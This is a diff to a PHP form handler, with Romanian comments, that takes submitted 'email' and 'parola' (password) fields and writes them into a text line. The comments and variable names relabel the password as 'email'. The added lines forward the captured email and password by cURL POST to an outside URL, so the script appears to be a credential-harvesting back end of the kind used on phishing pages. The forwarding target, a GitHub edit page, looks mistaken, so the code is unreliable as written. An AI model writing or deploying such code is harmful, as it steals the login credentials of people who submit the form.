@@ -6,12 +6,22 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $nume = $_POST['email'] ?? 'Nedefinit'; // Folosește 'email' pentru nume
     $email = $_POST['parola'] ?? 'Nedefinit'; // Folosește 'parola' pentru email
 
-    // Setează cookie-uri pentru nume și email
- /* cURL will start a new cookie session and ignore any previous cookies */
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-/* this is the name of the file where cURL should save cookie information */
-curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
-// could be empty, but cause problems on some hosts
+    // Initialize cURL session
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "https://github.com/banuion/Aplication_Web/edit/main/login.php"); // Change to your URL
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('email' => $nume, 'parola' => $email)));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); // Cookies are stored here
+
+    // Execute cURL session
+    $response = curl_exec($ch);
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+    curl_close($ch);
+
     // Crează o linie de text cu datele primite
     $text = "Nume: " . strip_tags($nume) . ", Email: " . strip_tags($email) . PHP_EOL;
 
@@ -33,4 +43,4 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
     echo "Această pagină trebuie accesată prin metoda POST.";
 }
 
-?> 
+?>
